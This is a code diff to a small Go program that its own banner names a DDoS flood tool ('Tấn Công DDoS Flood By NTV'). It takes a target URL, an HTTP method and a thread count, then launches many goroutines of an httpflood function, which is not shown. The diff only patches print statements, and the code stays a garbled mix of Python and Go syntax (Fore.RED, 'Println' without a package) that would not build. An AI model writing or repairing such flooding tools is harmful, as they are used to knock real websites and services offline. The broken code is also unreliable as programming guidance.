@@ -4,7 +4,7 @@ import(
   "crypto/tls"
   "os"
   "strconv"
-  "Print"
+  "fmt"
   "github.com/valyala/fasthttp"
 )
 var target struct{
@@ -32,15 +32,15 @@ func main(){
   target.url = os.Args[1]
   target.method = os.Args[2]
   threads, _ := strconv.Atoi(os.Args[3])
-  Print(Fore.RED +'Đang Khởi Động                           ')
-  Print(Fore.RED +' [..              [..                    ') 
-  Print(Fore.RED +' [..              [..                    ')
-  Print(Fore.RED +' [..[.. [..       [..[. [...   [..       ') 
-  Print(Fore.RED +' [.. [..  [.. [.. [.. [..    [..  [..    ') 
-  Print(Fore.RED +' [.. [..  [..[.   [.. [..   [..   [..    ')
-  Print(Fore.RED +' [.. [..  [..[.   [.. [..   [..   [..    ') 
-  Print(Fore.RED +' [..[...  [.. [.. [..[...     [.. [...   ')
-  Print(Fore.RED +'              Tấn Công DDoS Flood By NTV ')
+  Println(Fore.RED +"Đang Khởi Động                           ")
+  Println(Fore.RED +" [..              [..                    ") 
+  Println(Fore.RED +" [..              [..                    ")
+  Println(Fore.RED +" [..[.. [..       [..[. [...   [..       ") 
+  Println(Fore.RED +" [.. [..  [.. [.. [.. [..    [..  [..    ") 
+  Println(Fore.RED +" [.. [..  [..[.   [.. [..   [..   [..    ")
+  Println(Fore.RED +" [.. [..  [..[.   [.. [..   [..   [..    ") 
+  Println(Fore.RED +" [..[...  [.. [.. [..[...     [.. [...   ")
+  Println(Fore.RED +"              Tấn Công DDoS Flood By NTV ")
    for i:=0; i < threads; i++{
      go httpflood()
    }
